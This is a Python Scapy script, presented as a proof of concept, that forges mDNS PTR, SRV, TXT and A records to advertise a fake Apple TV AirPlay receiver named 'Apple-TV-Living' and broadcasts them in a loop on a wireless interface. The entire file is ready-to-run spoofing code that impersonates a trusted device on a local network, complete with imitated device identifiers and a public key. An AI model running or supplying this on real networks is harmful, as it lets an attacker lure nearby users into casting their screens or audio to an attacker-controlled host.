# realistic_scapy_airplay.py - realistic PoC that mimics Apple TV in mDNS structure

from scapy.all import *

iface = "wlan1"

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def build_txt(txts):
    return b"".join([bytes([len(t)]) + t for t in txts])

# detailed and realistic TXT records
apple_txt = build_txt([
    b"deviceid=12:34:56:78:90:ab",
    b"features=0x5A7FFFF7",
    b"model=AppleTV5,3",
    b"srcvers=220.68",
    b"protovers=1.1",
    b"vv=2",
    b"flags=0x4",
    b"pi=E2D5E415-EDB4-4F67-BE08-A3125D4986B6",
    b"pk=711AF3C3043C5C2F8A60BBFB5BE3C5ABBDCB7B8E173B3609939EDE57AA9375C2"
])

# core names
base_name = "Apple-TV-Living._airplay._tcp.local"
service_name = "_airplay._tcp.local"
hostname = "faketv.local"
ip_address = "172.16.16.251"  # must match your Kali IP if you want to be realistic

# create packet components
ptr = DNSRR(rrname=service_name, type="PTR", ttl=4500, rdata=base_name)
srv = DNSRR(rrname=base_name, type="SRV", ttl=120, rdata="0 0 7000 %s" % hostname)
txt = DNSRR(rrname=base_name, type="TXT", ttl=4500, rdata=apple_txt)
a_record = DNSRR(rrname=hostname, type="A", ttl=120, rdata=ip_address)

# build full mDNS packet
pkt = (
    Ether(dst="ff:ff:ff:ff:ff:ff") /
    IP(dst="224.0.0.251") /
    UDP(sport=5353, dport=5353) /
    DNS(
        id=0,
        qr=1,
        aa=1,
        qdcount=0,
        ancount=4,
        an=[ptr, srv, txt, a_record]
    )
)

print(Colors.GREEN + "[*] broadcasting realistic AirPlay fake device 'Apple-TV-Living'..." + Colors.ENDC)
sendp(pkt, iface=iface, loop=1, inter=2, verbose=True)
